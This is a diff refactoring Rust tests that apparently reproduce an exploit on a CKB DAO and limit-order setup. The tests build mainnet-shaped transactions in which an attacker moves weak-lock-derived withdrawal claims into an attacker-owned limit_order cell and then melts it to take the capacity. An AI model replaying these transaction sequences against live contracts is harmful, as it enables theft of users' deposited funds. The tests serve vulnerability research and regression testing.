@@ -41,147 +41,69 @@ fn weak_lock_derived_five_claim_live_batch_can_flow_into_later_attacker_owned_li
         ),
     ];
 
-    let batch_tx_hash = byte32_from_hex(
-        "0x8eb6c29fb8be1dfe36a6a3ecb6a131b178df6d57fa93866b78acb06664f6e282",
+    let batch_tx = "0x8eb6c29fb8be1dfe36a6a3ecb6a131b178df6d57fa93866b78acb06664f6e282";
+    let owned = |index, capacity, data, since| In {
+        header: Some(withdraw_header.clone()),
+        since: u64_from_hex(since),
+        ..at(batch_tx, index, live(capacity, &owned_owner, Some(&dao), data))
+    };
+    let owner = |index| at(batch_tx, index, live("0x2540be400", &attacker_lock, Some(&owned_owner), "0xfbffffff"));
+    let later = TxSpec {
+        inputs: vec![
+            owned(4, "0xa6260cdd291", "0x3640e20000000000", "0x20070804f5002c7a"),
+            owned(3, "0xa626031d463", "0xa03fe20000000000", "0x200708045f002c7a"),
+            owned(2, "0xa625f06529d", "0x803ee20000000000", "0x200708033f002c7a"),
+            owned(1, "0xa625b231491", "0xc33ae20000000000", "0x200708068a002c79"),
+            owned(0, "0xa6256cf8302", "0x9a36e20000000000", "0x2007080261002c79"),
+            owner(9),
+            owner(8),
+            owner(7),
+            owner(6),
+            owner(5),
+        ],
+        outputs: vec![
+            live("0x23c346000", &attacker_lock, Some(&limit_order), "0x").into(),
+            live(
+                "0x1bea98cf00",
+                &limit_order,
+                Some(&xudt),
+                "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff0000c16ff2862300bcedcc32756529000000000000000000000000000000000021",
+            )
+            .into(),
+            live("0x34d6567f32d3", &attacker_lock, None, "0x").into(),
+        ],
+        header_deps: [vec![withdraw_header.clone()], deposit_headers.to_vec()].concat(),
+    };
+
+    let later_tx = replay(
+        &mut context,
+        &later,
+        vec![
+            bytes_from_hex("0x1c00000010000000100000001c000000080000000100000000000000"),
+            bytes_from_hex("0x1c00000010000000100000001c000000080000000200000000000000"),
+            bytes_from_hex("0x1c00000010000000100000001c000000080000000300000000000000"),
+            bytes_from_hex("0x1c00000010000000100000001c000000080000000400000000000000"),
+            bytes_from_hex("0x1c00000010000000100000001c000000080000000500000000000000"),
+            Bytes::new(),
+        ],
     );
-    let owned_capacities = [
-        "0xa6256cf8302",
-        "0xa625b231491",
-        "0xa625f06529d",
-        "0xa626031d463",
-        "0xa6260cdd291",
-    ];
-    let owned_data = [
-        "0x9a36e20000000000",
-        "0xc33ae20000000000",
-        "0x803ee20000000000",
-        "0xa03fe20000000000",
-        "0x3640e20000000000",
-    ];
-
-    for index in 0..owned_capacities.len() {
-        let out_point = OutPoint::new(batch_tx_hash.clone(), index as u32);
-        context.create_cell_with_out_point(
-            out_point.clone(),
-            cell(u64_from_hex(owned_capacities[index]), &owned_owner, Some(&dao)),
-            bytes_from_hex(owned_data[index]),
-        );
-        link_cell_to_header(&mut context, &out_point, &withdraw_header);
-    }
-    for header in &deposit_headers {
-        context.insert_header(header.clone());
-    }
-
-    for index in 0..owned_capacities.len() {
-        let out_point = OutPoint::new(batch_tx_hash.clone(), (index as u32) + 5);
-        context.create_cell_with_out_point(
-            out_point,
-            cell(u64_from_hex("0x2540be400"), &attacker_lock, Some(&owned_owner)),
-            bytes_from_hex("0xfbffffff"),
-        );
-    }
-
-    let later_tx = TransactionBuilder::default()
-        .input(
-            CellInput::new_builder()
-                .previous_output(OutPoint::new(batch_tx_hash.clone(), 4))
-                .since(u64_from_hex("0x20070804f5002c7a"))
-                .build(),
-        )
-        .input(
-            CellInput::new_builder()
-                .previous_output(OutPoint::new(batch_tx_hash.clone(), 3))
-                .since(u64_from_hex("0x200708045f002c7a"))
-                .build(),
-        )
-        .input(
-            CellInput::new_builder()
-                .previous_output(OutPoint::new(batch_tx_hash.clone(), 2))
-                .since(u64_from_hex("0x200708033f002c7a"))
-                .build(),
-        )
-        .input(
-            CellInput::new_builder()
-                .previous_output(OutPoint::new(batch_tx_hash.clone(), 1))
-                .since(u64_from_hex("0x200708068a002c79"))
-                .build(),
-        )
-        .input(
-            CellInput::new_builder()
-                .previous_output(OutPoint::new(batch_tx_hash.clone(), 0))
-                .since(u64_from_hex("0x2007080261002c79"))
-                .build(),
-        )
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 9)))
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 8)))
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 7)))
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 6)))
-        .input(input(OutPoint::new(batch_tx_hash, 5)))
-        .outputs(vec![
-            cell(u64_from_hex("0x23c346000"), &attacker_lock, Some(&limit_order)),
-            cell(u64_from_hex("0x1bea98cf00"), &limit_order, Some(&xudt)),
-            cell(u64_from_hex("0x34d6567f32d3"), &attacker_lock, None),
-        ])
-        .outputs_data(
-            vec![
-                Bytes::new(),
-                bytes_from_hex(
-                    "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff0000c16ff2862300bcedcc32756529000000000000000000000000000000000021",
-                ),
-                Bytes::new(),
-            ]
-            .pack(),
-        )
-        .witnesses(
-            vec![
-                bytes_from_hex("0x1c00000010000000100000001c000000080000000100000000000000"),
-                bytes_from_hex("0x1c00000010000000100000001c000000080000000200000000000000"),
-                bytes_from_hex("0x1c00000010000000100000001c000000080000000300000000000000"),
-                bytes_from_hex("0x1c00000010000000100000001c000000080000000400000000000000"),
-                bytes_from_hex("0x1c00000010000000100000001c000000080000000500000000000000"),
-                Bytes::new(),
-            ]
-            .pack(),
-        )
-        .header_dep(withdraw_header.hash())
-        .header_dep(deposit_headers[0].hash())
-        .header_dep(deposit_headers[1].hash())
-        .header_dep(deposit_headers[2].hash())
-        .header_dep(deposit_headers[3].hash())
-        .header_dep(deposit_headers[4].hash())
-        .build();
-
-    let later_tx = context.complete_tx(later_tx);
     context
         .verify(&later_tx, MAX_CYCLES)
         .expect("weak-lock five-claim batch should reach the attacker-owned limit_order state");
 
     let later_hash = later_tx.hash();
-    let master_out_point = OutPoint::new(later_hash.clone(), 0);
-    let order_out_point = OutPoint::new(later_hash, 1);
-    context.create_cell_with_out_point(
-        master_out_point.clone(),
-        later_tx.outputs().get(0).expect("master output"),
-        Bytes::new(),
-    );
-    context.create_cell_with_out_point(
-        order_out_point.clone(),
-        later_tx.outputs().get(1).expect("order output"),
-        bytes_from_hex(
-            "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff0000c16ff2862300bcedcc32756529000000000000000000000000000000000021",
-        ),
-    );
+    let melt = TxSpec {
+        inputs: vec![
+            In { out_point: OutPoint::new(later_hash.clone(), 1), ..In::new(later.outputs[1].cell.clone()) },
+            In { out_point: OutPoint::new(later_hash, 0), ..In::new(later.outputs[0].cell.clone()) },
+        ],
+        outputs: vec![
+            Cell { capacity: u64_from_hex("0x1bea98cf00") + u64_from_hex("0x23c346000"), lock: attacker_lock, type_: None, data: vec![] }.into(),
+        ],
+        ..Default::default()
+    };
 
-    let melt_tx = TransactionBuilder::default()
-        .input(input(order_out_point))
-        .input(input(master_out_point))
-        .output(
-            cell(u64_from_hex("0x1bea98cf00") + u64_from_hex("0x23c346000"), &attacker_lock, None),
-        )
-        .output_data(Bytes::new().pack())
-        .build();
-
-    let melt_tx = context.complete_tx(melt_tx);
+    let melt_tx = replay(&mut context, &melt, vec![]);
     context
         .verify(&melt_tx, MAX_CYCLES)
         .expect("attacker should melt the resulting attacker-owned limit_order state");
@@ -222,210 +144,108 @@ fn weak_lock_derived_eight_claim_batch_can_flow_into_later_attacker_owned_limit_
             "0x0ca04d8cc7e790549aa202be419529009edf535dd5772f080061c8c69bf43607",
         ),
     ];
-    for header in &deposit_headers {
-        context.insert_header(header.clone());
-    }
 
-    let batch_tx_hash = byte32_from_hex(
-        "0xaa5670d939c85198afc38595e0334e859c80716fa64b37aecd7fc8b7511056e4",
-    );
-    let owned_capacities = [
-        "0xaac00b02e36",
-        "0xaac0158018d",
-        "0xaa71806dfc1",
-        "0xaa71806dfc1",
-        "0xaa71806dfc1",
-        "0xaa71806dfc1",
-        "0xaa71849baec",
-    ];
-    let owned_data = [
-        "0x6ca6fb0000000000",
-        "0xdca6fb0000000000",
-        "0x28aef70000000000",
-        "0x28aef70000000000",
-        "0x28aef70000000000",
-        "0x28aef70000000000",
-        "0x5aaef70000000000",
-    ];
-    for index in 0..owned_capacities.len() {
-        let out_point = OutPoint::new(batch_tx_hash.clone(), index as u32);
-        context.create_cell_with_out_point(
-            out_point.clone(),
-            cell(u64_from_hex(owned_capacities[index]), &owned_owner, Some(&dao)),
-            bytes_from_hex(owned_data[index]),
-        );
-        link_cell_to_header(&mut context, &out_point, &withdraw_header);
-    }
-    for index in 0..owned_capacities.len() {
-        let out_point = OutPoint::new(batch_tx_hash.clone(), (index as u32) + 8);
-        context.create_cell_with_out_point(
-            out_point,
-            cell(u64_from_hex("0x2540be400"), &attacker_lock, Some(&owned_owner)),
-            bytes_from_hex("0xf8ffffff"),
-        );
-    }
-    context.create_cell_with_out_point(
-        OutPoint::new(batch_tx_hash.clone(), 16),
-        cell(u64_from_hex("0x23c346000"), &attacker_lock, Some(&limit_order)),
-        Bytes::new(),
-    );
-    context.create_cell_with_out_point(
-        OutPoint::new(batch_tx_hash.clone(), 17),
-        cell(u64_from_hex("0x4a221e700"), &limit_order, Some(&xudt)),
-        bytes_from_hex(
-            "0xd45e0323c20200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff000000000000000000000000000000000000c16ff2862300fe12a4eaa0ca290021",
-        ),
-    );
-    context.create_cell_with_out_point(
-        OutPoint::new(batch_tx_hash.clone(), 18),
-        cell(u64_from_hex("0x142514df48"), &attacker_lock, None),
-        Bytes::new(),
-    );
+    let batch_tx = "0xaa5670d939c85198afc38595e0334e859c80716fa64b37aecd7fc8b7511056e4";
+    let owned = |index, capacity, data, since| In {
+        header: Some(withdraw_header.clone()),
+        since: u64_from_hex(since),
+        ..at(batch_tx, index, live(capacity, &owned_owner, Some(&dao), data))
+    };
+    let owner = |index| at(batch_tx, index, live("0x2540be400", &attacker_lock, Some(&owned_owner), "0xf8ffffff"));
+    let deposit = || live("0xab5f2c8d6b0", &ickb_logic, Some(&dao), "0x0000000000000000").into();
+    let later = TxSpec {
+        inputs: vec![
+            at(
+                batch_tx,
+                17,
+                live(
+                    "0x4a221e700",
+                    &limit_order,
+                    Some(&xudt),
+                    "0xd45e0323c20200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff000000000000000000000000000000000000c16ff2862300fe12a4eaa0ca290021",
+                ),
+            ),
+            at(batch_tx, 16, live("0x23c346000", &attacker_lock, Some(&limit_order), "0x")),
+            at(batch_tx, 18, live("0x142514df48", &attacker_lock, None, "0x")),
+            owned(6, "0xaa71849baec", "0x5aaef70000000000", "0x20057701e1003125"),
+            owned(5, "0xaa71806dfc1", "0x28aef70000000000", "0x20057701af003125"),
+            owned(4, "0xaa71806dfc1", "0x28aef70000000000", "0x20057701af003125"),
+            owned(3, "0xaa71806dfc1", "0x28aef70000000000", "0x20057701af003125"),
+            owned(2, "0xaa71806dfc1", "0x28aef70000000000", "0x20057701af003125"),
+            owned(1, "0xaac0158018d", "0xdca6fb0000000000", "0x2004ad0260003124"),
+            owned(0, "0xaac00b02e36", "0x6ca6fb0000000000", "0x2004ad01f0003124"),
+            owner(14),
+            owner(13),
+            owner(12),
+            owner(11),
+            owner(10),
+            owner(9),
+            owner(8),
+        ],
+        outputs: vec![
+            deposit(),
+            deposit(),
+            deposit(),
+            deposit(),
+            deposit(),
+            deposit(),
+            live("0x283baec00", &attacker_lock, Some(&ickb_logic), "0x06000000b0c4060ab40a0000").into(),
+            live("0x23c346000", &attacker_lock, Some(&limit_order), "0x").into(),
+            live(
+                "0xa4a505d73a0",
+                &limit_order,
+                Some(&xudt),
+                "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff0000c16ff286230032784f5372e129000000000000000000000000000000000021",
+            )
+            .into(),
+            live("0x372261400", &attacker_lock, Some(&xudt), "0xd45e0323c20200000000000000000000").into(),
+            live("0x8c3ee380ed", &attacker_lock, None, "0x").into(),
+        ],
+        header_deps: vec![
+            withdraw_header.clone(),
+            deposit_headers[3].clone(),
+            deposit_headers[2].clone(),
+            deposit_headers[1].clone(),
+            deposit_headers[0].clone(),
+        ],
+    };
 
-    let witness_1 = header_dep_index_witness(1);
     let witness_2 = header_dep_index_witness(2);
-    let witness_3 = header_dep_index_witness(3);
-    let witness_4 = header_dep_index_witness(4);
-
-    let later_tx = TransactionBuilder::default()
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 17)))
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 16)))
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 18)))
-        .input(
-            CellInput::new_builder()
-                .previous_output(OutPoint::new(batch_tx_hash.clone(), 6))
-                .since(u64_from_hex("0x20057701e1003125"))
-                .build(),
-        )
-        .input(
-            CellInput::new_builder()
-                .previous_output(OutPoint::new(batch_tx_hash.clone(), 5))
-                .since(u64_from_hex("0x20057701af003125"))
-                .build(),
-        )
-        .input(
-            CellInput::new_builder()
-                .previous_output(OutPoint::new(batch_tx_hash.clone(), 4))
-                .since(u64_from_hex("0x20057701af003125"))
-                .build(),
-        )
-        .input(
-            CellInput::new_builder()
-                .previous_output(OutPoint::new(batch_tx_hash.clone(), 3))
-                .since(u64_from_hex("0x20057701af003125"))
-                .build(),
-        )
-        .input(
-            CellInput::new_builder()
-                .previous_output(OutPoint::new(batch_tx_hash.clone(), 2))
-                .since(u64_from_hex("0x20057701af003125"))
-                .build(),
-        )
-        .input(
-            CellInput::new_builder()
-                .previous_output(OutPoint::new(batch_tx_hash.clone(), 1))
-                .since(u64_from_hex("0x2004ad0260003124"))
-                .build(),
-        )
-        .input(
-            CellInput::new_builder()
-                .previous_output(OutPoint::new(batch_tx_hash.clone(), 0))
-                .since(u64_from_hex("0x2004ad01f0003124"))
-                .build(),
-        )
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 14)))
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 13)))
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 12)))
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 11)))
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 10)))
-        .input(input(OutPoint::new(batch_tx_hash.clone(), 9)))
-        .input(input(OutPoint::new(batch_tx_hash, 8)))
-        .outputs(vec![
-            cell(u64_from_hex("0xab5f2c8d6b0"), &ickb_logic, Some(&dao)),
-            cell(u64_from_hex("0xab5f2c8d6b0"), &ickb_logic, Some(&dao)),
-            cell(u64_from_hex("0xab5f2c8d6b0"), &ickb_logic, Some(&dao)),
-            cell(u64_from_hex("0xab5f2c8d6b0"), &ickb_logic, Some(&dao)),
-            cell(u64_from_hex("0xab5f2c8d6b0"), &ickb_logic, Some(&dao)),
-            cell(u64_from_hex("0xab5f2c8d6b0"), &ickb_logic, Some(&dao)),
-            cell(u64_from_hex("0x283baec00"), &attacker_lock, Some(&ickb_logic)),
-            cell(u64_from_hex("0x23c346000"), &attacker_lock, Some(&limit_order)),
-            cell(u64_from_hex("0xa4a505d73a0"), &limit_order, Some(&xudt)),
-            cell(u64_from_hex("0x372261400"), &attacker_lock, Some(&xudt)),
-            cell(u64_from_hex("0x8c3ee380ed"), &attacker_lock, None),
-        ])
-        .outputs_data(
-            vec![
-                bytes_from_hex("0x0000000000000000"),
-                bytes_from_hex("0x0000000000000000"),
-                bytes_from_hex("0x0000000000000000"),
-                bytes_from_hex("0x0000000000000000"),
-                bytes_from_hex("0x0000000000000000"),
-                bytes_from_hex("0x0000000000000000"),
-                bytes_from_hex("0x06000000b0c4060ab40a0000"),
-                Bytes::new(),
-                bytes_from_hex(
-                    "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff0000c16ff286230032784f5372e129000000000000000000000000000000000021",
-                ),
-                bytes_from_hex("0xd45e0323c20200000000000000000000"),
-                Bytes::new(),
-            ]
-            .pack(),
-        )
-        .witnesses(
-            vec![
-                bytes_from_hex("0x10000000100000001000000010000000"),
-                bytes_from_hex(
-                    "0x69000000100000006900000069000000550000005500000010000000550000005500000041000000fe20813789f911946343d69c6fb13cd56c4b87b333d824a699546f500103d21d21c9a11c7775756aaf6532b24dfbea44b05ed28d8f649fd0a79260c6c77a676c00",
-                ),
-                bytes_from_hex("0x10000000100000001000000010000000"),
-                witness_1,
-                witness_2.clone(),
-                witness_2.clone(),
-                witness_2.clone(),
-                witness_2,
-                witness_3,
-                witness_4,
-            ]
-            .pack(),
-        )
-        .header_dep(withdraw_header.hash())
-        .header_dep(deposit_headers[3].hash())
-        .header_dep(deposit_headers[2].hash())
-        .header_dep(deposit_headers[1].hash())
-        .header_dep(deposit_headers[0].hash())
-        .build();
-
-    let later_tx = context.complete_tx(later_tx);
+    let later_tx = replay(
+        &mut context,
+        &later,
+        vec![
+            bytes_from_hex("0x10000000100000001000000010000000"),
+            bytes_from_hex(
+                "0x69000000100000006900000069000000550000005500000010000000550000005500000041000000fe20813789f911946343d69c6fb13cd56c4b87b333d824a699546f500103d21d21c9a11c7775756aaf6532b24dfbea44b05ed28d8f649fd0a79260c6c77a676c00",
+            ),
+            bytes_from_hex("0x10000000100000001000000010000000"),
+            header_dep_index_witness(1),
+            witness_2.clone(),
+            witness_2.clone(),
+            witness_2.clone(),
+            witness_2,
+            header_dep_index_witness(3),
+            header_dep_index_witness(4),
+        ],
+    );
     context
         .verify(&later_tx, MAX_CYCLES)
         .expect("weak-lock mainnet batch should reach the attacker-owned limit_order state");
 
     let later_hash = later_tx.hash();
-    let master_out_point = OutPoint::new(later_hash.clone(), 7);
-    let order_out_point = OutPoint::new(later_hash, 8);
-    context.create_cell_with_out_point(
-        master_out_point.clone(),
-        later_tx.outputs().get(7).expect("master output"),
-        Bytes::new(),
-    );
-    context.create_cell_with_out_point(
-        order_out_point.clone(),
-        later_tx.outputs().get(8).expect("order output"),
-        bytes_from_hex(
-            "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff0000c16ff286230032784f5372e129000000000000000000000000000000000021",
-        ),
-    );
+    let melt = TxSpec {
+        inputs: vec![
+            In { out_point: OutPoint::new(later_hash.clone(), 8), ..In::new(later.outputs[8].cell.clone()) },
+            In { out_point: OutPoint::new(later_hash, 7), ..In::new(later.outputs[7].cell.clone()) },
+        ],
+        outputs: vec![
+            Cell { capacity: u64_from_hex("0xa4a505d73a0") + u64_from_hex("0x23c346000"), lock: attacker_lock, type_: None, data: vec![] }.into(),
+        ],
+        ..Default::default()
+    };
 
-    let melt_tx = TransactionBuilder::default()
-        .input(input(order_out_point))
-        .input(input(master_out_point))
-        .output(
-            cell(u64_from_hex("0xa4a505d73a0") + u64_from_hex("0x23c346000"), &attacker_lock, None),
-        )
-        .output_data(Bytes::new().pack())
-        .build();
-
-    let melt_tx = context.complete_tx(melt_tx);
+    let melt_tx = replay(&mut context, &melt, vec![]);
     context
         .verify(&melt_tx, MAX_CYCLES)
         .expect("attacker should melt the resulting mainnet-shaped limit_order state");
